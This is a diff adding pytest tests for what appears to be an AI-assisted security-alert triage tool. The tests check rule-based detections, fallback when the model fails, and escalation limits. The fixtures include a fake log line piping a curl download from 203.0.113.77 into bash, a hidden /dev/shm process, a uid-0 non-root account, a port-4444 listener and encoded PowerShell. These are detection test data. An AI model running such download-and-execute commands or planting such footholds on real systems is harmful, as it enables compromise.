@@ -745,3 +745,141 @@ def test_bench_scratch_stores_never_use_the_shared_database(tmp_path, monkeypatc
     s = SocStore(tmp_path / "case0.sqlite", scratch=True)
     s.add_note("c1", "t", "x")
     assert (tmp_path / "case0.sqlite").exists()
+
+
+# ---------- fixed evidence checks (no model) ----------
+
+from tests.soc_fakes import SourcesHub  # noqa: E402
+
+HOSTA = {"id": "h1", "@timestamp": "2026-11-01T10:00:00Z", "agent.name": "srv1", "rule.id": "P1", "rule.level": 12,
+         "rule.description": "Process running from a memory-backed path", "data.process.name": ".udevd",
+         "data.process.command_line": "/dev/shm/.udevd"}
+
+
+def rules_case(home, alert, hub, mutate=None):
+    from actaeon.soc.intake import ingest
+    from actaeon.soc.service import triage_case
+
+    def m(d):
+        d["soc"].update(analysis="rules")
+        d["soc"]["intake"].update(severity_scale="15")
+        if mutate:
+            mutate(d)
+    cfg, store = cfg_store(home, m)
+    cid = ingest(cfg, store, [alert])["cases_opened"][0]
+    return triage_case(cfg, cid, llm=FakeLLM([]), hub=hub, store=store), store
+
+
+def test_rules_find_a_related_temp_path_process_without_a_model(home):
+    hub = SourcesHub(processes=[{"agent.name": "srv1", "process.name": ".udevd", "process.command_line": "/dev/shm/.udevd"}])
+    c, _ = rules_case(home, HOSTA, hub)
+    names = {s["name"] for s in c["report"]["signals"]}
+    assert c["verdict"] == "true_positive" and "temp_path_exec" in names and c["usage"].get("calls", 0) == 0
+    collector = [k for k in hub.kw if k.get("actor") == "collector"]
+    assert c["report"]["findings"][0]["evidence"] and collector and all(k["max_bytes"] >= 1_000_000 for k in collector)
+    q = next(a for (n, t, a) in hub.calls if n == "inv" and t == "search")["query"]
+    assert q == 'agent.name:"srv1"'                        # the host field was found with get_fields
+
+
+def test_unrelated_host_findings_go_to_an_analyst(home):
+    hub = SourcesHub(processes=[{"agent.name": "srv1", "process.name": ".other", "process.command_line": "/tmp/.other"}])
+    alert = {**HOSTA, "id": "h2", "rule.description": "Disk check failed", "data.process.name": "fsck",
+             "data.process.command_line": "fsck -n /dev/sda1"}
+    c, _ = rules_case(home, alert, hub)
+    assert c["verdict"] == "needs_analyst" and c["status"] == "needs_analyst"
+    assert any(s["name"] == "host_temp_path_exec" for s in c["report"]["signals"])
+
+
+def test_uid0_and_listener_and_intel_signals(home):
+    hub = SourcesHub(users=[{"agent.name": "srv1", "user.name": "backup2", "user.id": "0"}],
+                     ports=[{"agent.name": "srv1", "process.name": ".sync", "source.port": 4444, "interface.state": "listening"}],
+                     intel=["203.0.113.77"],
+                     events=[{"agent.name": "srv1", "full_log": "backup2: curl -fsSL http://203.0.113.77/x | bash"}])
+    alert = {**HOSTA, "id": "h3", "rule.description": "Account other than root has uid 0", "data.srcuser": "backup2",
+             "data.dstip": "203.0.113.77", "data.process.name": "", "data.process.command_line": ""}
+    c, _ = rules_case(home, alert, hub)
+    names = {s["name"] for s in c["report"]["signals"]}
+    assert {"uid0_non_root", "intel_match", "download_piped_to_shell", "host_hidden_listener"} <= names
+    assert c["verdict"] == "true_positive" and c["confidence"] >= 70
+
+
+def test_known_good_note_makes_a_rules_benign(home):
+    alert = {**HOSTA, "id": "h4", "rule.level": 5, "rule.description": "Encoded PowerShell", "data.srcuser": "svc.bkp",
+             "data.process.name": "powershell.exe", "data.process.command_line": "powershell -enc " + "QQ" * 20}
+    c, _ = rules_case(home, alert, SourcesHub(), lambda d: d.update(environment={"known_good": ["svc.bkp runs backups on srv1"]}))
+    assert c["verdict"] == "benign" and c["status"] == "triaged"        # low severity: no second person needed
+
+
+def test_strong_signal_blocks_a_model_dismissal(home):
+    hub = SourcesHub(processes=[{"agent.name": "srv1", "process.name": ".udevd", "process.command_line": "/dev/shm/.udevd"}])
+    from actaeon.soc.intake import ingest
+    from actaeon.soc.service import triage_case
+    cfg, store = cfg_store(home, lambda d: (d["soc"].update(verify=False), d["soc"]["intake"].update(severity_scale="15")))
+    cid = ingest(cfg, store, [HOSTA])["cases_opened"][0]
+    c = triage_case(cfg, cid, llm=FakeLLM([verdict("false_positive", ev=("E1",))]), hub=hub, store=store)
+    assert c["verdict"] == "needs_analyst" and any("strong signs of an attack" in x for x in c["report"]["checks"])
+
+
+def test_model_failure_falls_back_to_the_rules(home):
+    from actaeon.providers.base import LLMResult
+    from actaeon.soc.intake import ingest
+    from actaeon.soc.service import triage_case
+
+    class Broken(FakeLLM):
+        def for_role(self, role):
+            b = super().for_role(role)
+            b.chat = lambda messages, **kw: LLMResult(text="", model="x", error="connection refused")
+            return b
+    hub = SourcesHub(processes=[{"agent.name": "srv1", "process.name": ".udevd", "process.command_line": "/dev/shm/.udevd"}])
+    cfg, store = cfg_store(home, lambda d: (d["soc"].update(verify=False, first_look=False),
+                                            d["soc"]["intake"].update(severity_scale="15")))
+    cid = ingest(cfg, store, [HOSTA])["cases_opened"][0]
+    c = triage_case(cfg, cid, llm=Broken(), hub=hub, store=store)
+    assert c["verdict"] == "true_positive" and any("model failed" in g for g in c["report"]["gaps"])
+
+
+def test_collected_evidence_reaches_the_model_first(home):
+    hub = SourcesHub(processes=[{"agent.name": "srv1", "process.name": ".udevd", "process.command_line": "/dev/shm/.udevd"}])
+    from actaeon.soc.intake import ingest
+    from actaeon.soc.service import triage_case
+    cfg, store = cfg_store(home, lambda d: (d["soc"].update(verify=False), d["soc"]["intake"].update(severity_scale="15")))
+    cid = ingest(cfg, store, [HOSTA])["cases_opened"][0]
+    llm = FakeLLM([verdict("true_positive", ev=("E1",))])
+    triage_case(cfg, cid, llm=llm, hub=hub, store=store)
+    msgs = next(m for role, m in llm.seen if role == "analyst")
+    assert any("Evidence already collected by fixed checks" in x["content"] and "temporary path" in x["content"]
+               for x in msgs)
+
+
+def test_connector_field_map_overrides_discovery(home):
+    from actaeon.connectors.spec import parse_connectors
+    s, = parse_connectors([{"name": "x", "roles": ["log_search"], "transport": "stdio", "command": "y",
+                            "fields": {"host": "device.hostname"}}])
+    assert s.raw_fields == {"host": "device.hostname"}
+
+
+def test_playbook_collect_steps_are_checked(tmp_path):
+    from actaeon.soc.playbooks import load
+    (tmp_path / "x.yaml").write_text("title: X\nmatch: {rules: ['R']}\nsteps: [a]\ncollect: [decode, magic]\n")
+    with pytest.raises(ValueError, match="collect"):
+        load([str(tmp_path)])
+
+
+def test_hard_case_escalates_to_the_stronger_model(home):
+    def m(d):
+        d["soc"].update(verify=False, escalate={"provider": "ollama", "model": "big", "min_severity": 50, "max_per_day": 1})
+    from actaeon.soc.intake import ingest
+    from actaeon.soc.service import escalations_today, triage_case
+    cfg, store = cfg_store(home, m)
+    cid = ingest(cfg, store, [ALERT])["cases_opened"][0]
+    small = FakeLLM([call(), verdict("needs_analyst", ev=())])
+    big = FakeLLM([call(), verdict("true_positive")])
+    c = triage_case(cfg, cid, llm=small, hub=FakeHub(), store=store, escalate_llm=big)
+    assert c["verdict"] == "true_positive" and c["report"]["escalated"]["first_pass"]["verdict"] == "needs_analyst"
+    assert escalations_today(store) == 1 and any(r == "analyst" for r, _ in big.seen)
+    cid2 = ingest(cfg, store, [{**ALERT, "id": "x2", "host": {"name": "WS2"}, "user": {"name": "bob"},
+                               "destination": {"ip": "203.0.113.9"}}])["cases_opened"][0]
+    big2 = FakeLLM([call(), verdict("true_positive")])
+    c2 = triage_case(cfg, cid2, llm=FakeLLM([call(), verdict("needs_analyst", ev=())]), hub=FakeHub(), store=store,
+                     escalate_llm=big2)
+    assert c2["verdict"] == "needs_analyst" and big2.seen == []          # the daily limit is reached
